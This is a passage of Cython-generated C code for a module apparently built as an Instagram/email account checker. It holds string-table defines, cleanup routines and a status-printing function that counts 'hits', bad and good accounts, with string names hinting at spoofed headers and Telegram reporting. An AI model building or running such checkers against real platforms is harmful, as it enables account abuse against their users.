__pyx_string_tab[287]\n#define __pyx_kp_u_pip_install_user_agent __pyx_string_tab[288]\n#define __pyx_kp_u_pip_install_uuid __pyx_string_tab[289]\n#define __pyx_n_u_pk __pyx_string_tab[290]\n#define __pyx_n_u_pop __pyx_string_tab[291]\n#define __pyx_n_u_post __pyx_string_tab[292]\n#define __pyx_n_u_pp __pyx_string_tab[293]\n#define __pyx_n_u_pppp __pyx_string_tab[294]\n#define __pyx_n_u_print __pyx_string_tab[295]\n#define __pyx_n_u_printing __pyx_string_tab[296]\n#define __pyx_n_u_priority __pyx_string_tab[297]\n#define __pyx_kp_u_qcom_en_US_545986 __pyx_string_tab[298]\n#define __pyx_n_u_qualname __pyx_string_tab[299]\n#define __pyx_n_u_query __pyx_string_tab[300]\n#define __pyx_n_u_r __pyx_string_tab[301]\n#define __pyx_n_u_rand_ids __pyx_string_tab[302]\n#define __pyx_n_u_randint __pyx_string_tab[303]\n#define __pyx_n_u_random __pyx_string_tab[304]\n#define __pyx_n_u_randrange __pyx_string_tab[305]\n#define __pyx_n_u_range __pyx_string_tab[306]\n#define __pyx_n_u_re __pyx_string_tab[307]\n#define __pyx_n_u_read __pyx_string_tab[308]\n#define __pyx_n_u_red __pyx_string_tab[309]\n#define __pyx_n_u_referer __pyx_string_tab[310]\n#define __pyx_n_u_render __pyx_string_tab[311]\n#define __pyx_n_u_requests __pyx_string_tab[312]\n#define __pyx_n_u_res1 __pyx_string_tab[313]\n#define __pyx_n_u_response __pyx_string_tab[314]\n#define __pyx_n_u_rest __pyx_string_tab[315]\n#define __pyx_n_u_rich_console __pyx_string_tab[316]\n#define __pyx_n_u_rich_panel __pyx_string_tab[317]\n#define __pyx_n_u_rnd __pyx_string_tab[318]\n#define __pyx_n_u_rr __pyx_string_tab[319]\n#define __pyx_n_u_search __pyx_string_tab[320]\n#define __pyx_n_u_send __pyx_string_tab[321]\n#define __pyx_kp_u_sendMessage_chat_id __pyx_string_tab[322]\n#define __pyx_n_u_server_timestamps __pyx_string_tab[323]\n#define __pyx_n_u_set_name __pyx_string_tab[324]\n#define __pyx_n_u_signed_body __pyx_string_tab[325]\n#define __pyx_n_u_sleep __pyx_string_tab[326]\n#define __pyx_n_u_space __pyx_string_tab[327]\n#define __pyx_n_u_spec __pyx_string_tab[328]\n#define __pyx_n_u_split __pyx_string_tab[329]\n#define __pyx_n_u_splitlines __pyx_string_tab[330]\n#define __pyx_n_u_ss __pyx_string_tab[331]\n#define __pyx_n_u_start __pyx_string_tab[332]\n#define __pyx_n_u_stdout __pyx_string_tab[333]\n#define __pyx_n_u_subprocess __pyx_string_tab[334]\n#define __pyx_n_u_sys __pyx_string_tab[335]\n#define __pyx_n_u_system __pyx_string_tab[336]\n#define __pyx_n_u_t __pyx_string_tab[337]\n#define __pyx_n_u_target __pyx_string_tab[338]\n#define __pyx_n_u_test __pyx_string_tab[339]\n#define __pyx_n_u_text __pyx_string_tab[340]\n#define __pyx_kp_u_text_2 __pyx_string_tab[341]\n#define __pyx_n_u_threading __pyx_string_tab[342]\n#define __pyx_n_u_threads __pyx_string_tab[343]\n#define __pyx_n_u_throw __pyx_string_tab[344]\n#define __pyx_n_u_time __pyx_string_tab[345]\n#define __pyx_n_u_tl __pyx_string_tab[346]\n#define __pyx_kp_u_tl_txt __pyx_string_tab[347]\n#define __pyx_n_u_tll __pyx_string_tab[348]\n#define __pyx_n_u_tll_locals_genexpr __pyx_string_tab[349]\n#define __pyx_n_u_tok __pyx_string_tab[350]\n#define __pyx_n_u_total __pyx_string_tab[351]\n#define __pyx_n_u_true __pyx_string_tab[352]\n#define __pyx_kp_u_u_1_i __pyx_string_tab[353]\n#define __pyx_n_u_ua __pyx_string_tab[354]\n#define __pyx_n_u_uid __pyx_string_tab[355]\n#define __pyx_n_u_user __pyx_string_tab[356]\n#define __pyx_kp_u_userID __pyx_string_tab[357]\n#define __pyx_kp_u_user_agent __pyx_string_tab[358]\n#define __pyx_n_u_user_agent_2 __pyx_string_tab[359]\n#define __pyx_n_u_username __pyx_string_tab[360]\n#define __pyx_kp_u_username_cristiano __pyx_string_tab[361]\n#define __pyx_kp_u_utf_8 __pyx_string_tab[362]\n#define __pyx_n_u_util __pyx_string_tab[363]\n#define __pyx_n_u_uui __pyx_string_tab[364]\n#define __pyx_n_u_uuid __pyx_string_tab[365]\n#define __pyx_n_u_uuid4 __pyx_string_tab[366]\n#define __pyx_n_u_uuu __pyx_string_tab[367]\n#define __pyx_n_u_uuu_locals_genexpr __pyx_string_tab[368]\n#define __pyx_n_u_value __pyx_string_tab[369]\n#define __pyx_n_u_variables __pyx_string_tab[370]\n#define __pyx_n_u_w __pyx_string_tab[371]\n#define __pyx_n_u_webbrowser __pyx_string_tab[372]\n#define __pyx_n_u_write __pyx_string_tab[373]\n#define __pyx_n_u_x __pyx_string_tab[374]\n#define __pyx_kp_u_x_fb_friendly_name __pyx_string_tab[375]\n#define __pyx_kp_u_x_fb_lsd __pyx_string_tab[376]\n#define __pyx_n_u_yy __pyx_string_tab[377]\n\n#if CYTHON_USE_MODULE_STATE\nstatic CYTHON_SMALL_CODE int __pyx_m_clear(PyObject *m) {\n  __pyx_mstatetype *clear_module_state = __Pyx_PyModule_GetState(m);\n  if (!clear_module_state) return 0;\n  Py_CLEAR(clear_module_state->__pyx_d);\n  Py_CLEAR(clear_module_state->__pyx_b);\n  Py_CLEAR(clear_module_state->__pyx_cython_runtime);\n  Py_CLEAR(clear_module_state->__pyx_empty_tuple);\n  Py_CLEAR(clear_module_state->__pyx_empty_bytes);\n  Py_CLEAR(clear_module_state->__pyx_empty_unicode);\n  #ifdef __Pyx_CyFunction_USED\n  Py_CLEAR(clear_module_state->__pyx_CyFunctionType);\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  Py_CLEAR(clear_module_state->__pyx_FusedFunctionType);\n  #endif\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  __Pyx_State_RemoveModule(NULL);\n  #endif\n  Py_CLEAR(clear_module_state->__pyx_ptype_2op___pyx_scope_struct__genexpr);\n  Py_CLEAR(clear_module_state->__pyx_type_2op___pyx_scope_struct__genexpr);\n  Py_CLEAR(clear_module_state->__pyx_ptype_2op___pyx_scope_struct_1_genexpr);\n  Py_CLEAR(clear_module_state->__pyx_type_2op___pyx_scope_struct_1_genexpr);\n  Py_CLEAR(clear_module_state->__pyx_ptype_2op___pyx_scope_struct_2_genexpr);\n  Py_CLEAR(clear_module_state->__pyx_type_2op___pyx_scope_struct_2_genexpr);\n  Py_CLEAR(clear_module_state->__pyx_ptype_2op___pyx_scope_struct_3_genexpr);\n  Py_CLEAR(clear_module_state->__pyx_type_2op___pyx_scope_struct_3_genexpr);\n  for (int i=0; i<1; ++i) { Py_CLEAR(clear_module_state->__pyx_slice[i]); }\n  for (int i=0; i<24; ++i) { Py_CLEAR(clear_module_state->__pyx_tuple[i]); }\n  for (int i=0; i<15; ++i) { Py_CLEAR(clear_module_state->__pyx_codeobj_tab[i]); }\n  for (int i=0; i<378; ++i) { Py_CLEAR(clear_module_state->__pyx_string_tab[i]); }\n  Py_CLEAR(clear_module_state->__pyx_int_0);\n  Py_CLEAR(clear_module_state->__pyx_int_1);\n  Py_CLEAR(clear_module_state->__pyx_int_2);\n  Py_CLEAR(clear_module_state->__pyx_int_3);\n  Py_CLEAR(clear_module_state->__pyx_int_5);\n  Py_CLEAR(clear_module_state->__pyx_int_6);\n  Py_CLEAR(clear_module_state->__pyx_int_9);\n  Py_CLEAR(clear_module_state->__pyx_int_10);\n  Py_CLEAR(clear_module_state->__pyx_int_11);\n  Py_CLEAR(clear_module_state->__pyx_int_15);\n  Py_CLEAR(clear_module_state->__pyx_int_16);\n  Py_CLEAR(clear_module_state->__pyx_int_30);\n  Py_CLEAR(clear_module_state->__pyx_int_100);\n  Py_CLEAR(clear_module_state->__pyx_int_111);\n  Py_CLEAR(clear_module_state->__pyx_int_150);\n  Py_CLEAR(clear_module_state->__pyx_int_200);\n  Py_CLEAR(clear_module_state->__pyx_int_208);\n  Py_CLEAR(clear_module_state->__pyx_int_999);\n  Py_CLEAR(clear_module_state->__pyx_int_1000);\n  Py_CLEAR(clear_module_state->__pyx_int_1300);\n  Py_CLEAR(clear_module_state->__pyx_int_2000);\n  Py_CLEAR(clear_module_state->__pyx_int_2010);\n  Py_CLEAR(clear_module_state->__pyx_int_2011);\n  Py_CLEAR(clear_module_state->__pyx_int_2012);\n  Py_CLEAR(clear_module_state->__pyx_int_2013);\n  Py_CLEAR(clear_module_state->__pyx_int_2014);\n  Py_CLEAR(clear_module_state->__pyx_int_2015);\n  Py_CLEAR(clear_module_state->__pyx_int_2016);\n  Py_CLEAR(clear_module_state->__pyx_int_2017);\n  Py_CLEAR(clear_module_state->__pyx_int_2018);\n  Py_CLEAR(clear_module_state->__pyx_int_2019);\n  Py_CLEAR(clear_module_state->__pyx_int_1000000);\n  Py_CLEAR(clear_module_state->__pyx_int_1279000);\n  Py_CLEAR(clear_module_state->__pyx_int_1279001);\n  Py_CLEAR(clear_module_state->__pyx_int_17750000);\n  Py_CLEAR(clear_module_state->__pyx_int_17750001);\n  Py_CLEAR(clear_module_state->__pyx_int_279760000);\n  Py_CLEAR(clear_module_state->__pyx_int_279760001);\n  Py_CLEAR(clear_module_state->__pyx_int_900990000);\n  Py_CLEAR(clear_module_state->__pyx_int_900990001);\n  Py_CLEAR(clear_module_state->__pyx_int_1629010000);\n  Py_CLEAR(clear_module_state->__pyx_int_1900000000);\n  Py_CLEAR(clear_module_state->__pyx_int_2500000000);\n  Py_CLEAR(clear_module_state->__pyx_int_3713668786);\n  Py_CLEAR(clear_module_state->__pyx_int_5699785217);\n  Py_CLEAR(clear_module_state->__pyx_int_8507940634);\n  Py_CLEAR(clear_module_state->__pyx_int_21254029834);\n  return 0;\n}\n#endif\n\n#if CYTHON_USE_MODULE_STATE\nstatic CYTHON_SMALL_CODE int __pyx_m_traverse(PyObject *m, visitproc visit, void *arg) {\n  __pyx_mstatetype *traverse_module_state = __Pyx_PyModule_GetState(m);\n  if (!traverse_module_state) return 0;\n  Py_VISIT(traverse_module_state->__pyx_d);\n  Py_VISIT(traverse_module_state->__pyx_b);\n  Py_VISIT(traverse_module_state->__pyx_cython_runtime);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_empty_tuple);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_empty_bytes);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_empty_unicode);\n  #ifdef __Pyx_CyFunction_USED\n  Py_VISIT(traverse_module_state->__pyx_CyFunctionType);\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  Py_VISIT(traverse_module_state->__pyx_FusedFunctionType);\n  #endif\n  Py_VISIT(traverse_module_state->__pyx_ptype_2op___pyx_scope_struct__genexpr);\n  Py_VISIT(traverse_module_state->__pyx_type_2op___pyx_scope_struct__genexpr);\n  Py_VISIT(traverse_module_state->__pyx_ptype_2op___pyx_scope_struct_1_genexpr);\n  Py_VISIT(traverse_module_state->__pyx_type_2op___pyx_scope_struct_1_genexpr);\n  Py_VISIT(traverse_module_state->__pyx_ptype_2op___pyx_scope_struct_2_genexpr);\n  Py_VISIT(traverse_module_state->__pyx_type_2op___pyx_scope_struct_2_genexpr);\n  Py_VISIT(traverse_module_state->__pyx_ptype_2op___pyx_scope_struct_3_genexpr);\n  Py_VISIT(traverse_module_state->__pyx_type_2op___pyx_scope_struct_3_genexpr);\n  for (int i=0; i<1; ++i) { __Pyx_VISIT_CONST(traverse_module_state->__pyx_slice[i]); }\n  for (int i=0; i<24; ++i) { __Pyx_VISIT_CONST(traverse_module_state->__pyx_tuple[i]); }\n  for (int i=0; i<15; ++i) { __Pyx_VISIT_CONST(traverse_module_state->__pyx_codeobj_tab[i]); }\n  for (int i=0; i<378; ++i) { __Pyx_VISIT_CONST(traverse_module_state->__pyx_string_tab[i]); }\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_0);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_1);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_3);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_5);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_6);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_9);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_10);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_11);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_15);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_16);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_30);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_100);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_111);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_150);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_200);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_208);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_999);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_1000);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_1300);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2000);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2010);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2011);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2012);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2013);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2014);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2015);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2016);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2017);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2018);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2019);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_1000000);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_1279000);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_1279001);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_17750000);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_17750001);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_279760000);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_279760001);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_900990000);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_900990001);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_1629010000);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_1900000000);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_2500000000);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_3713668786);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_5699785217);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_8507940634);\n  __Pyx_VISIT_CONST(traverse_module_state->__pyx_int_21254029834);\n  return 0;\n}\n#endif\n\n\n\n\n\nstatic PyObject *__pyx_pw_2op_1pppp(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); \nstatic PyMethodDef __pyx_mdef_2op_1pppp = {"pppp", (PyCFunction)__pyx_pw_2op_1pppp, METH_NOARGS, 0};\nstatic PyObject *__pyx_pw_2op_1pppp(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {\n  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;\n  PyObject *__pyx_r = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("pppp (wrapper)", 0);\n  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);\n  __pyx_r = __pyx_pf_2op_pppp(__pyx_self);\n\n  \n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyObject *__pyx_pf_2op_pppp(CYTHON_UNUSED PyObject *__pyx_self) {\n  PyObject *__pyx_v_b = NULL;\n  CYTHON_UNUSED PyObject *__pyx_v_bo = NULL;\n  PyObject *__pyx_v_output = NULL;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3[3];\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  PyObject *__pyx_t_6 = NULL;\n  PyObject *__pyx_t_7 = NULL;\n  int __pyx_t_8;\n  size_t __pyx_t_9;\n  PyObject *__pyx_t_10[9];\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("pppp", 0);\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_mstate_global->__pyx_n_u_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 95, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_mstate_global->__pyx_n_u_randint); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 95, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_mstate_global->__pyx_tuple[0], NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 95, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_v_b = __pyx_t_1;\n  __pyx_t_1 = 0;\n\n  \n  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_v_b, __pyx_mstate_global->__pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 96, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_3[0] = __pyx_mstate_global->__pyx_kp_u_38_5;\n  __pyx_t_3[1] = __pyx_t_1;\n  __pyx_t_3[2] = __pyx_mstate_global->__pyx_n_u_m;\n  __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_3, 3, 7 + __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1) + 1, 127 | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1));\n  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 96, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_v_bo = ((PyObject*)__pyx_t_2);\n  __pyx_t_2 = 0;\n\n  \n  __pyx_t_1 = NULL;\n  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 97, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_4);\n  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 97, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 97, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_name); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 97, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_7);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __pyx_t_8 = (__Pyx_PyUnicode_Equals(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_nt, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 97, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n  if (__pyx_t_8) {\n    __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_cls);\n    __pyx_t_4 = __pyx_mstate_global->__pyx_n_u_cls;\n  } else {\n    __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_clear);\n    __pyx_t_4 = __pyx_mstate_global->__pyx_n_u_clear;\n  }\n  __pyx_t_9 = 1;\n  #if CYTHON_UNPACK_METHODS\n  if (unlikely(PyMethod_Check(__pyx_t_5))) {\n    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_5);\n    assert(__pyx_t_1);\n    PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_5);\n    __Pyx_INCREF(__pyx_t_1);\n    __Pyx_INCREF(__pyx__function);\n    __Pyx_DECREF_SET(__pyx_t_5, __pyx__function);\n    __pyx_t_9 = 0;\n  }\n  #endif\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_1, __pyx_t_4};\n    __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+__pyx_t_9, (2-__pyx_t_9) | (__pyx_t_9*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 97, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n  }\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_hits); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 99, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_mstate_global->__pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 99, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_badinsta); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 100, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_mstate_global->__pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 100, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_4);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_bademail); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 101, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_mstate_global->__pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 101, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_goodig); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 102, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_mstate_global->__pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 102, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_7);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_10[0] = __pyx_mstate_global->__pyx_kp_u_True;\n  __pyx_t_10[1] = __pyx_t_5;\n  __pyx_t_10[2] = __pyx_mstate_global->__pyx_kp_u_Gen;\n  __pyx_t_10[3] = __pyx_t_4;\n  __pyx_t_10[4] = __pyx_mstate_global->__pyx_kp_u_Bad;\n  __pyx_t_10[5] = __pyx_t_1;\n  __pyx_t_10[6] = __pyx_mstate_global->__pyx_kp_u_Not;\n  __pyx_t_10[7] = __pyx_t_7;\n  __pyx_t_10[8] = __pyx_mstate_global->__pyx_kp_u_;\n\n  \n  __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_10, 9, 17 * 4 + __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5) + __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4) + __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1) + __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7) + 3, 65535 | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7));\n  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 98, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n  __pyx_v_output = ((PyObject*)__pyx_t_2);\n  __pyx_t_2 = 0;\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_mstate_global->__pyx_n_u_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 104, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_mstate_global->__pyx_n_u_stdout); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 104, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_4);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_7 = __pyx_t_4;\n  __Pyx_INCREF(__pyx_t_7);\n  __pyx_t_9 = 0;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_v_output};\n    __pyx_t_2 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_write, __pyx_callargs+__pyx_t_9, (2-__pyx_t_9) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 104, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n  }\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_sys); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 105, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_7);\n  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_stdout); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 105, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n  __pyx_t_4 = __pyx_t_1;\n  __Pyx_INCREF(__pyx_t_4);\n  __pyx_t_9 = 0;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_4, NULL};\n    __pyx_t_2 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_flush, __pyx_callargs+__pyx_t_9, (1-__pyx_t_9) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 105, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n  }\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n\n  \n  __pyx_r = Py_None; __Pyx_INCREF(Py_None);\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_XDECREF(__pyx_t_2);\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_XDECREF(__pyx_t_5);\n  __Pyx_XDECREF(__pyx_t_6);\n  __Pyx_XDECREF(__pyx_t_7);\n  __Pyx_AddTraceback("op.pppp", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __pyx_L0:;\n  __Pyx_XDECREF(__pyx_v_b);\n  __Pyx_XDECREF(__pyx_v_bo);\n  __Pyx_XDECREF(__pyx_v_output);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\n\n\n\nstatic PyObject *__pyx_pw_2op_3tll(PyObject 